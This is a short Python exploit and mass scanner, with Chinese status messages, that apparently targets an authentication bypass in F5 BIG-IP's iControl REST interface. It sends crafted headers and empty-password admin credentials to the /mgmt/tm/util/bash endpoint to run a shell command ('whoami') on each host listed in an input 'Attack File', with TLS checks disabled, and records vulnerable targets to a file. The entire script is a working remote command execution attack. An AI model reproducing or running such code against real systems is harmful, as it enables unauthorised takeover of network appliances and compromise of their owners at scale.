import requests
import json
import argparse
import urllib3
urllib3.disable_warnings()

def POC(target_url):
	burp0_url = target_url + "/mgmt/tm/util/bash"
	burp0_headers = {"Connection": "Keep-Alive, X-F5-Auth-Token", "X-F5-Auth-Token": "a", "Authorization": "Basic YWRtaW46"}
	burp0_json = {"command": "run", "utilCmdArgs": "-c whoami"}
	try:
		res = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False, timeout=2)
		if "commandResult" in res.text and res.status_code == 200:
			print("[o] 目标 {}存在漏洞,响应为:{} ".format(target_url, json.loads(res.text)["commandResult"]))
			with open('success.txt', 'a+', encoding="utf-8") as f:
				f.write(target_url + '\n')
		#r = json.loads(res.text)["commandResult"]
		#print(r)
		else:
			print("[x] 目标 {}不存在漏洞 ".format(target_url))
	except Exception as e:
		print("[x] 目标 {} 请求失败 ".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "https://" + url
            url = url.strip('\n')
            try:
                POC(url)

            except Exception as e:
                print("[x] 请求报错 ".format(e))
                continue

if __name__ == '__main__':
    file_name  = str(input("Please input Attack File\nFile >>> "))
    Scan(file_name)